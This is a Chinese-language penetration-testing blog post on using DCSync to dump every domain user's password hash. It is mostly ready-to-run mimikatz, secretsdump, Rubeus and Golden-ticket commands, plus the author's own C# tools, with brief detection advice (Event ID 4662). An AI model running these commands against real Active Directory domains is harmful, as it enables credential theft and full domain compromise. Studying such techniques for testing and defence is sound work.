---
layout: post
title: 域渗透——利用DCSync导出域内所有用户hash的方法
---


## 0x00 前言
---

在之前的文章[《域渗透——DCSync》](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync)曾系统的整理过DCSync的利用方法，本文将要针对利用DCSync导出域内所有用户hash这一方法进行详细介绍，分析不同环境下的利用思路，给出防御建议。

## 0x01 简介
---

本文将要介绍以下内容：

- 利用条件
- 利用工具
- 利用思路
- 防御建议

## 0x02 利用条件
---

获得以下任一用户的权限：

- Administrators组内的用户
- Domain Admins组内的用户
- Enterprise Admins组内的用户
- 域控制器的计算机帐户

## 0x03 利用工具
---

### 1.C实现([mimikatz](https://github.com/gentilkiwi/mimikatz))

实现代码：

https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27

示例命令：

#### (1)导出域内所有用户的hash

```
mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv" exit
```

#### (2)导出域内administrator帐户的hash

```
mimikatz.exe "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
```

### 2.Python实现([secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py))

示例命令：

```
python secretsdump.py test/Administrator:DomainAdmin123!@192.168.1.1
```

### 3.Powershell实现([MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin))

核心代码使用C Sharp实现，支持以下三个功能：

- 通过DCSync导出krbtgt用户的hash
- 使用krbtgt用户的hash生成Golden ticket
- 导入Golden ticket

**注：**

我在测试环境下实验结果显示，生成Golden ticket的功能存在bug，导入Golden ticket后无法获得对应的权限

### 4.C Sharp实现

我在([MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin))的基础上做了以下修改：

- 支持导出所有用户hash
- 导出域sid
- 导出所有域用户sid

代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync.cs

#### 补充：代码开发细节

输出Dictionary中所有的键和值：
 
```
foreach(string key in values.Keys)
{
    Console.WriteLine(string.Format("key:{0} value{1}", key, values[key]));
}
```

byte数组转string，用来输出hash：

```
byte[] data = values["ATT_UNICODE_PWD"] as byte[];
Console.WriteLine(BitConverter.ToString(data).Replace("-",""));
```

string转byte数组，用来将hash转换成byte数组：

```
string hex = "D4FE97B4FD50367C7AE8FEF781F27A2E";
var inputByteArray = new byte[hex.Length / 2];
for (var x = 0; x < inputByteArray.Length; x++)
{
    var i = Convert.ToInt32(hex.Substring(x * 2, 2), 16);
    inputByteArray[x] = (byte)i;
}
```

## 0x04 利用思路
---

### 1.在域控制器上执行

0x03中提到的工具均可以

### 2.在域内主机上执行

#### (1)Mimikatz

有以下两种利用思路：

- 导入票据，执行DCSync
- 利用Over pass the hash启动脚本，脚本执行DCSync

#### (2)secretsdump.py

直接执行即可

#### (3)C Sharp实现

首先需要生成票据

有以下两种利用思路：

1. 拿到krbtgt用户的hash，在本地使用Mimikatz生成Golden ticket

命令示例：

```
mimikatz "kerberos::golden /user:Administrator /domain:TEST.COM /sid:S-1-5-21-254706111-4049838133-2416123456 /krbtgt:D4FE97B4FD50367C7AE8FEF781F27A2E /ticket:test.kirbi"
```

2. 拿到高权限用户，使用[Rubeus](https://github.com/GhostPack/Rubeus)发送请求获得ticket

命令示例：

```
Rubeus.exe asktgt /user:administrator /password:123456 /outfile:test.kirbi
Rubeus.exe asktgt /user:administrator /rc4:D4FE97B4FD50367C7AE8FEF781F27A2E /outfile:test.kirbi
```

接着导入票据

可以选择SharpTGTImporter.cs，代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync.cs

我在([MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin))的基础上做了以下修改：

- 支持导入指定票据文件

命令示例：

```
SharpTGTImporter.exe test.kirbi
```

最后执行DCSync

导出所有用户hash可以选择SharpDCSync.cs，代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync.cs

命令示例：

```
SharpDCSync.exe dc1.test.com TEST.COM
```

导出krbtgt用户hash可以选择SharpDCSync_krbtgt.cs，代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync_krbtgt.cs

命令示例：

```
SharpDCSync_krbtgt.exe dc1.test.com TEST.COM
```


### 3.在域外主机上执行

方法同“2.在域内主机上执行”


## 0x05 防御建议
---

攻击者需要以下任一用户的权限：

- Administrators组内的用户
- Domain Admins组内的用户
- Enterprise Admins组内的用户
- 域控制器的计算机帐户

通过事件日志检测可以选择监控日志Event ID 4662

参考资料：

https://www.blacklanternsecurity.com/2020-12-04-DCSync/

## 0x06 小结
---

本文介绍了利用DCSync导出域内所有用户hash的方法，在([MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin))的基础上编写代码SharpTGTImporter.cs和SharpDCSync.cs，便于利用，结合利用思路，给出防御建议。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





